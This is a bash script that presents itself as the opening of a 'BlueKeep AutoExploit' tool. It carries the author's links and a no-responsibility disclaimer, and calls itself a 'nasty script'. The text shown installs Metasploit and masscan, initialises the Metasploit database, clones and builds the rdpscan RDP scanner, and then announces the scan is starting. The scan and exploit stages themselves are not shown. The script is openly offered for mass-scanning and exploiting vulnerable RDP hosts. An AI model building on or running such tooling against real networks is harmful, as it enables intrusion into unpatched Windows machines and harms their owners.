#!/bin/bash
echo BlueKeep AutoExploit script by independent, DEPLOYING;
echo https://github.com/ind3p3nd3nt/BlueRDPSploit;
echo Facebook: https://fb.me/remi.girard2;
echo LinkedIn: https://rebrand.ly/1091c;
echo ---DISCLAIMER--- I AM NOT RESPONSIBLE FOR ANY ACTIONS YOU MAKE WITH THIS PROGRAM. THE ONLY RESPONSIBLE PERSON IS YOU!;
sleep 5s;
echo Installing necessary files to run this nasty script.;
apt update && apt install git metasploit-framework libssl-dev -y;
service postgresql start;
msfdb init;
apt install masscan -y
cd ..;
git clone https://github.com/robertdavidgraham/rdpscan.git;
cd rdpscan;
make -j8;
chmod +x rdpscan;
cp ./rdpscan ../rdp;
cd ..;
echo Installation step is done, now starting rdp scanner...;
